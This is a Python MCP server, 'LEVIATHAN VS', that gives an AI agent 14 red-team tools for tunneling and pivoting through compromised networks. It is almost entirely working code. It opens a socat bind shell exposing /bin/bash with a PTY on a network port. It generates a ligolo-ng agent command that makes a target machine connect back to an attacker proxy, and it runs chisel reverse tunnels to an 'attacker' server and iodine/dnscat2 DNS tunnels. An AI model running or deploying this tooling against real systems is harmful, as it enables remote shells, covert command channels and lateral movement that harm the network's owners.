#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
    LEVIATHAN VS - MCP Tunneling & Pivoting Server v1.0.0

    Network tunneling and pivoting MCP server for red team engagements.
    Integrates: chisel, ligolo-ng, socat, sshuttle, proxychains, ssh.
    JSON-RPC 2.0 over stdio with Content-Length framing.

    Tools (14):
        - chisel_server: Start Chisel reverse tunnel server
        - chisel_client: Connect Chisel client to server
        - ligolo_proxy: Start Ligolo-ng proxy server
        - ligolo_agent: Deploy Ligolo-ng agent on target
        - socat_relay: Create socat relay/port forward
        - socat_listener: Start socat listener with PTY
        - sshuttle_vpn: Create transparent VPN over SSH
        - ssh_tunnel_local: SSH local port forwarding (-L)
        - ssh_tunnel_remote: SSH remote port forwarding (-R)
        - ssh_tunnel_dynamic: SSH dynamic SOCKS proxy (-D)
        - proxychains_run: Run command through proxy chain
        - proxychains_config: Generate proxychains configuration
        - netcat_relay: Create netcat relay for pivoting
        - dns_tunnel: DNS tunneling with iodine/dnscat2

    Author: ThiagoFrag / LEVIATHAN VS
    Version: 1.0.0
================================================================================
"""

import asyncio
import json
import logging
import os
import shutil
import subprocess
import sys
import tempfile
from typing import Any, Dict, List, Optional

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler(sys.stderr)],
)
logger = logging.getLogger("leviathan-tunneling-mcp")

VERSION = "1.0.0"
SERVER_NAME = "leviathan-tunneling-server"


def _find_tool(name: str) -> str:
    p = shutil.which(name)
    return p if p else name


def _run_tool(cmd: List[str], timeout: int = 600) -> Dict:
    try:
        proc = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
            encoding="utf-8",
            errors="replace",
        )
        return {
            "success": proc.returncode == 0,
            "stdout": proc.stdout.strip()[:50000],
            "stderr": proc.stderr.strip()[:5000],
        }
    except subprocess.TimeoutExpired:
        return {"success": False, "error": f"Timeout after {timeout}s"}
    except FileNotFoundError:
        return {
            "success": False,
            "error": f"Tool not found: {cmd[0]}. Install it first.",
        }
    except Exception as e:
        return {"success": False, "error": str(e)}


def _start_background(cmd: List[str]) -> Dict:
    """Start a long-running process in background and return PID."""
    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            start_new_session=True,
        )
        return {
            "success": True,
            "pid": proc.pid,
            "command": " ".join(cmd),
            "message": f"Process started with PID {proc.pid}",
        }
    except FileNotFoundError:
        return {"success": False, "error": f"Tool not found: {cmd[0]}"}
    except Exception as e:
        return {"success": False, "error": str(e)}


TOOLS = [
    {
        "name": "chisel_server",
        "description": "Start Chisel reverse tunnel server (listens for client connections)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "port": {"type": "integer", "description": "Listen port (default: 8080)"},
                "reverse": {"type": "boolean", "description": "Allow reverse tunnels (default: true)"},
                "auth": {"type": "string", "description": "Authentication credentials (user:pass)"},
                "tls_key": {"type": "string", "description": "Path to TLS key file"},
                "tls_cert": {"type": "string", "description": "Path to TLS cert file"},
                "background": {"type": "boolean", "description": "Run in background (default: true)"},
            },
        },
    },
    {
        "name": "chisel_client",
        "description": "Connect Chisel client to server — create forward/reverse tunnels",
        "inputSchema": {
            "type": "object",
            "properties": {
                "server": {"type": "string", "description": "Server URL (e.g. http://attacker:8080)"},
                "tunnels": {"type": "string", "description": "Tunnel spec: local_port:remote_host:remote_port or R:remote_port:local_host:local_port"},
                "auth": {"type": "string", "description": "Authentication credentials (user:pass)"},
                "fingerprint": {"type": "string", "description": "Server fingerprint for verification"},
                "background": {"type": "boolean", "description": "Run in background"},
            },
            "required": ["server", "tunnels"],
        },
    },
    {
        "name": "ligolo_proxy",
        "description": "Start Ligolo-ng proxy server for tunneling through compromised hosts",
        "inputSchema": {
            "type": "object",
            "properties": {
                "laddr": {"type": "string", "description": "Listen address (default: 0.0.0.0:11601)"},
                "selfcert": {"type": "boolean", "description": "Use self-signed certificate"},
                "certfile": {"type": "string", "description": "Path to TLS certificate"},
                "keyfile": {"type": "string", "description": "Path to TLS key"},
                "background": {"type": "boolean", "description": "Run in background"},
            },
        },
    },
    {
        "name": "ligolo_agent",
        "description": "Deploy Ligolo-ng agent command for target (generates command to run on target)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "connect": {"type": "string", "description": "Proxy server address (e.g. attacker_ip:11601)"},
                "ignore_cert": {"type": "boolean", "description": "Ignore TLS certificate verification"},
                "retry": {"type": "boolean", "description": "Auto-retry on disconnect"},
            },
            "required": ["connect"],
        },
    },
    {
        "name": "socat_relay",
        "description": "Create socat relay for port forwarding and protocol translation",
        "inputSchema": {
            "type": "object",
            "properties": {
                "source": {"type": "string", "description": "Source address spec (e.g. TCP-LISTEN:8080,fork,reuseaddr)"},
                "dest": {"type": "string", "description": "Destination address spec (e.g. TCP:target:80)"},
                "background": {"type": "boolean", "description": "Run in background"},
            },
            "required": ["source", "dest"],
        },
    },
    {
        "name": "socat_listener",
        "description": "Start socat listener with PTY for interactive shell relay",
        "inputSchema": {
            "type": "object",
            "properties": {
                "port": {"type": "integer", "description": "Listen port"},
                "protocol": {"type": "string", "description": "Protocol: tcp, udp, ssl (default: tcp)"},
                "pty": {"type": "boolean", "description": "Allocate PTY for interactive shell"},
            },
            "required": ["port"],
        },
    },
    {
        "name": "sshuttle_vpn",
        "description": "Create transparent VPN-like tunnel over SSH (no admin on remote required)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "ssh_host": {"type": "string", "description": "SSH server (user@host)"},
                "subnets": {"type": "string", "description": "Subnets to route (e.g. 10.0.0.0/24 172.16.0.0/16)"},
                "exclude": {"type": "string", "description": "Subnets to exclude from routing"},
                "dns": {"type": "boolean", "description": "Tunnel DNS requests too"},
                "ssh_key": {"type": "string", "description": "Path to SSH private key"},
                "background": {"type": "boolean", "description": "Run in background"},
            },
            "required": ["ssh_host", "subnets"],
        },
    },
    {
        "name": "ssh_tunnel_local",
        "description": "SSH local port forwarding — access remote service through local port (-L)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "ssh_host": {"type": "string", "description": "SSH server (user@host)"},
                "local_port": {"type": "integer", "description": "Local port to listen on"},
                "remote_host": {"type": "string", "description": "Remote host to forward to (from SSH server perspective)"},
                "remote_port": {"type": "integer", "description": "Remote port to forward to"},
                "ssh_key": {"type": "string", "description": "SSH private key path"},
                "ssh_port": {"type": "integer", "description": "SSH port (default: 22)"},
                "background": {"type": "boolean", "description": "Run in background"},
            },
            "required": ["ssh_host", "local_port", "remote_host", "remote_port"],
        },
    },
    {
        "name": "ssh_tunnel_remote",
        "description": "SSH remote port forwarding — expose local service on remote (-R)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "ssh_host": {"type": "string", "description": "SSH server (user@host)"},
                "remote_port": {"type": "integer", "description": "Port on remote to listen on"},
                "local_host": {"type": "string", "description": "Local host to forward to (default: 127.0.0.1)"},
                "local_port": {"type": "integer", "description": "Local port to forward to"},
                "ssh_key": {"type": "string", "description": "SSH private key path"},
                "ssh_port": {"type": "integer", "description": "SSH port (default: 22)"},
                "background": {"type": "boolean", "description": "Run in background"},
            },
            "required": ["ssh_host", "remote_port", "local_port"],
        },
    },
    {
        "name": "ssh_tunnel_dynamic",
        "description": "SSH dynamic SOCKS proxy — route traffic through SSH (-D)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "ssh_host": {"type": "string", "description": "SSH server (user@host)"},
                "socks_port": {"type": "integer", "description": "Local SOCKS port (default: 1080)"},
                "ssh_key": {"type": "string", "description": "SSH private key path"},
                "ssh_port": {"type": "integer", "description": "SSH port (default: 22)"},
                "background": {"type": "boolean", "description": "Run in background"},
            },
            "required": ["ssh_host"],
        },
    },
    {
        "name": "proxychains_run",
        "description": "Run a command through proxychains (SOCKS4/SOCKS5/HTTP proxy chain)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "command": {"type": "string", "description": "Command to run through proxy (e.g. nmap -sT target)"},
                "config": {"type": "string", "description": "Path to proxychains config file"},
                "quiet": {"type": "boolean", "description": "Quiet mode (suppress proxy messages)"},
            },
            "required": ["command"],
        },
    },
    {
        "name": "proxychains_config",
        "description": "Generate proxychains configuration file",
        "inputSchema": {
            "type": "object",
            "properties": {
                "proxy_type": {"type": "string", "description": "Proxy type: socks4, socks5, http"},
                "proxy_host": {"type": "string", "description": "Proxy host (default: 127.0.0.1)"},
                "proxy_port": {"type": "integer", "description": "Proxy port (default: 1080)"},
                "chain_type": {"type": "string", "description": "Chain type: strict_chain, dynamic_chain, random_chain"},
                "output": {"type": "string", "description": "Output file path"},
                "dns_through_proxy": {"type": "boolean", "description": "Route DNS through proxy"},
            },
            "required": ["proxy_port"],
        },
    },
    {
        "name": "netcat_relay",
        "description": "Create netcat relay for port forwarding and pivoting",
        "inputSchema": {
            "type": "object",
            "properties": {
                "listen_port": {"type": "integer", "description": "Local port to listen on"},
                "target_host": {"type": "string", "description": "Target host to forward to"},
                "target_port": {"type": "integer", "description": "Target port to forward to"},
                "udp": {"type": "boolean", "description": "Use UDP instead of TCP"},
            },
            "required": ["listen_port", "target_host", "target_port"],
        },
    },
    {
        "name": "dns_tunnel",
        "description": "DNS tunneling using iodine or dnscat2",
        "inputSchema": {
            "type": "object",
            "properties": {
                "tool": {"type": "string", "description": "Tool: iodine, dnscat2 (default: iodine)"},
                "domain": {"type": "string", "description": "DNS tunnel domain"},
                "server": {"type": "string", "description": "DNS server IP (for client mode)"},
                "password": {"type": "string", "description": "Tunnel password"},
                "mode": {"type": "string", "description": "Mode: server, client"},
            },
            "required": ["domain", "mode"],
        },
    },
]


async def dispatch_tool(name: str, args: Dict) -> str:
    if name == "chisel_server":
        port = args.get("port", 8080)
        cmd = [_find_tool("chisel"), "server", "--port", str(port)]
        if args.get("reverse", True):
            cmd.append("--reverse")
        if args.get("auth"):
            cmd.extend(["--auth", args["auth"]])
        if args.get("tls_key"):
            cmd.extend(["--key", args["tls_key"]])
        if args.get("tls_cert"):
            cmd.extend(["--cert", args["tls_cert"]])
        if args.get("background", True):
            r = _start_background(cmd)
        else:
            r = _run_tool(cmd, timeout=10)
        return json.dumps(r, indent=2)

    elif name == "chisel_client":
        cmd = [_find_tool("chisel"), "client", args["server"], args["tunnels"]]
        if args.get("auth"):
            cmd.extend(["--auth", args["auth"]])
        if args.get("fingerprint"):
            cmd.extend(["--fingerprint", args["fingerprint"]])
        if args.get("background", True):
            r = _start_background(cmd)
        else:
            r = _run_tool(cmd, timeout=10)
        return json.dumps(r, indent=2)

    elif name == "ligolo_proxy":
        laddr = args.get("laddr", "0.0.0.0:11601")
        cmd = [_find_tool("ligolo-proxy"), "-laddr", laddr]
        if args.get("selfcert"):
            cmd.append("-selfcert")
        if args.get("certfile"):
            cmd.extend(["-certfile", args["certfile"]])
        if args.get("keyfile"):
            cmd.extend(["-keyfile", args["keyfile"]])
        if args.get("background", True):
            r = _start_background(cmd)
        else:
            r = _run_tool(cmd, timeout=10)
        return json.dumps(r, indent=2)

    elif name == "ligolo_agent":
        cmd_str = f"ligolo-agent -connect {args['connect']}"
        if args.get("ignore_cert"):
            cmd_str += " -ignore-cert"
        if args.get("retry"):
            cmd_str += " -retry"
        return json.dumps({
            "success": True,
            "agent_command": cmd_str,
            "message": "Run this command on the target machine to establish tunnel",
        }, indent=2)

    elif name == "socat_relay":
        cmd = [_find_tool("socat"), args["source"], args["dest"]]
        if args.get("background", True):
            r = _start_background(cmd)
        else:
            r = _run_tool(cmd, timeout=10)
        return json.dumps(r, indent=2)

    elif name == "socat_listener":
        port = args["port"]
        proto = args.get("protocol", "tcp").upper()
        source = f"{proto}-LISTEN:{port},fork,reuseaddr"
        if args.get("pty"):
            dest = "EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"
        else:
            dest = "STDOUT"
        cmd = [_find_tool("socat"), source, dest]
        r = _start_background(cmd)
        return json.dumps(r, indent=2)

    elif name == "sshuttle_vpn":
        cmd = [_find_tool("sshuttle"), "-r", args["ssh_host"]]
        cmd.extend(args["subnets"].split())
        if args.get("exclude"):
            cmd.extend(["-x", args["exclude"]])
        if args.get("dns"):
            cmd.append("--dns")
        if args.get("ssh_key"):
            cmd.extend(["-e", f"ssh -i {args['ssh_key']}"])
        if args.get("background", True):
            r = _start_background(cmd)
        else:
            r = _run_tool(cmd, timeout=10)
        return json.dumps(r, indent=2)

    elif name == "ssh_tunnel_local":
        port_spec = f"{args['local_port']}:{args['remote_host']}:{args['remote_port']}"
        cmd = [_find_tool("ssh"), "-N", "-L", port_spec, args["ssh_host"]]
        if args.get("ssh_key"):
            cmd.extend(["-i", args["ssh_key"]])
        if args.get("ssh_port"):
            cmd.extend(["-p", str(args["ssh_port"])])
        if args.get("background", True):
            r = _start_background(cmd)
        else:
            r = _run_tool(cmd, timeout=10)
        return json.dumps(r, indent=2)

    elif name == "ssh_tunnel_remote":
        local_host = args.get("local_host", "127.0.0.1")
        port_spec = f"{args['remote_port']}:{local_host}:{args['local_port']}"
        cmd = [_find_tool("ssh"), "-N", "-R", port_spec, args["ssh_host"]]
        if args.get("ssh_key"):
            cmd.extend(["-i", args["ssh_key"]])
        if args.get("ssh_port"):
            cmd.extend(["-p", str(args["ssh_port"])])
        if args.get("background", True):
            r = _start_background(cmd)
        else:
            r = _run_tool(cmd, timeout=10)
        return json.dumps(r, indent=2)

    elif name == "ssh_tunnel_dynamic":
        socks_port = args.get("socks_port", 1080)
        cmd = [_find_tool("ssh"), "-N", "-D", str(socks_port), args["ssh_host"]]
        if args.get("ssh_key"):
            cmd.extend(["-i", args["ssh_key"]])
        if args.get("ssh_port"):
            cmd.extend(["-p", str(args["ssh_port"])])
        if args.get("background", True):
            r = _start_background(cmd)
        else:
            r = _run_tool(cmd, timeout=10)
        return json.dumps(r, indent=2)

    elif name == "proxychains_run":
        pc = _find_tool("proxychains4") if shutil.which("proxychains4") else _find_tool("proxychains")
        cmd = [pc]
        if args.get("quiet"):
            cmd.append("-q")
        if args.get("config"):
            cmd.extend(["-f", args["config"]])
        cmd.extend(args["command"].split())
        r = _run_tool(cmd, timeout=600)
        return json.dumps(r, indent=2)

    elif name == "proxychains_config":
        proxy_type = args.get("proxy_type", "socks5")
        proxy_host = args.get("proxy_host", "127.0.0.1")
        proxy_port = args["proxy_port"]
        chain_type = args.get("chain_type", "strict_chain")
        dns = "proxy_dns" if args.get("dns_through_proxy", True) else "# proxy_dns"
        config = f"""# Generated by LEVIATHAN VS — Tunneling MCP
{chain_type}
{dns}
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
{proxy_type} {proxy_host} {proxy_port}
"""
        output = args.get("output", "/tmp/proxychains_leviathan.conf")
        try:
            with open(output, "w") as f:
                f.write(config)
            return json.dumps({
                "success": True,
                "config_path": output,
                "config_content": config,
                "usage": f"proxychains4 -f {output} <command>",
            }, indent=2)
        except Exception as e:
            return json.dumps({"success": False, "error": str(e)}, indent=2)

    elif name == "netcat_relay":
        # Creates a FIFO-based relay: mkfifo /tmp/pipe; nc -lp PORT < /tmp/pipe | nc HOST PORT > /tmp/pipe
        listen = args["listen_port"]
        target = args["target_host"]
        tport = args["target_port"]
        nc = _find_tool("nc")
        udp = "-u" if args.get("udp") else ""
        fifo = f"/tmp/leviathan_relay_{listen}"
        script = f"mkfifo {fifo} 2>/dev/null; {nc} -lvp {listen} {udp} < {fifo} | {nc} {target} {tport} {udp} > {fifo}"
        cmd = ["bash", "-c", script]
        r = _start_background(cmd)
        r["relay"] = f"localhost:{listen} -> {target}:{tport}"
        return json.dumps(r, indent=2)

    elif name == "dns_tunnel":
        tool = args.get("tool", "iodine")
        mode = args["mode"]
        domain = args["domain"]

        if tool == "iodine":
            if mode == "server":
                cmd = [_find_tool("iodined"), "-f"]
                if args.get("password"):
                    cmd.extend(["-P", args["password"]])
                cmd.extend(["10.0.0.1", domain])
            else:
                cmd = [_find_tool("iodine"), "-f"]
                if args.get("password"):
                    cmd.extend(["-P", args["password"]])
                if args.get("server"):
                    cmd.append(args["server"])
                cmd.append(domain)
        elif tool == "dnscat2":
            if mode == "server":
                cmd = [_find_tool("dnscat2-server"), domain]
                if args.get("password"):
                    cmd.extend(["--secret", args["password"]])
            else:
                cmd = [_find_tool("dnscat"), domain]
                if args.get("password"):
                    cmd.extend(["--secret", args["password"]])
                if args.get("server"):
                    cmd.extend(["--dns", f"server={args['server']}"])
        else:
            return json.dumps({"error": f"Unknown DNS tunnel tool: {tool}"})

        r = _start_background(cmd)
        return json.dumps(r, indent=2)

    return json.dumps({"error": f"Unknown tool: {name}"})


async def handle_message(msg: Dict) -> Optional[Dict]:
    method = msg.get("method", "")
    mid = msg.get("id")
    if method == "initialize":
        return {
            "jsonrpc": "2.0", "id": mid,
            "result": {
                "protocolVersion": "2024-11-05",
                "capabilities": {"tools": {"listChanged": False}},
                "serverInfo": {"name": SERVER_NAME, "version": VERSION},
            },
        }
    if method == "notifications/initialized":
        return None
    if method == "tools/list":
        return {"jsonrpc": "2.0", "id": mid, "result": {"tools": TOOLS}}
    if method == "tools/call":
        params = msg.get("params", {})
        tname = params.get("name", "")
        targs = params.get("arguments", {})
        try:
            result_text = await dispatch_tool(tname, targs)
        except Exception as exc:
            result_text = json.dumps({"error": str(exc)})
        return {
            "jsonrpc": "2.0", "id": mid,
            "result": {"content": [{"type": "text", "text": result_text}]},
        }
    if method == "ping":
        return {"jsonrpc": "2.0", "id": mid, "result": {}}
    return {
        "jsonrpc": "2.0", "id": mid,
        "error": {"code": -32601, "message": f"Method not found: {method}"},
    }


def _write_msg(data: Dict):
    body = json.dumps(data)
    frame = f"Content-Length: {len(body)}\r\n\r\n{body}"
    sys.stdout.buffer.write(frame.encode("utf-8"))
    sys.stdout.buffer.flush()


async def main_loop():
    if sys.platform == "win32":
        import msvcrt
        msvcrt.setmode(sys.stdin.fileno(), os.O_BINARY)
        msvcrt.setmode(sys.stdout.fileno(), os.O_BINARY)
    buf = b""
    logger.info(f"{SERVER_NAME} v{VERSION} started")
    while True:
        chunk = sys.stdin.buffer.read(1)
        if not chunk:
            break
        buf += chunk
        while b"\r\n\r\n" in buf:
            header, rest = buf.split(b"\r\n\r\n", 1)
            cl = 0
            for line in header.decode("utf-8", errors="replace").split("\r\n"):
                if line.lower().startswith("content-length:"):
                    cl = int(line.split(":", 1)[1].strip())
            if len(rest) < cl:
                buf = header + b"\r\n\r\n" + rest
                break
            body = rest[:cl]
            buf = rest[cl:]
            try:
                msg = json.loads(body)
            except json.JSONDecodeError:
                continue
            resp = await handle_message(msg)
            if resp:
                _write_msg(resp)


def main():
    asyncio.run(main_loop())


if __name__ == "__main__":
    main()
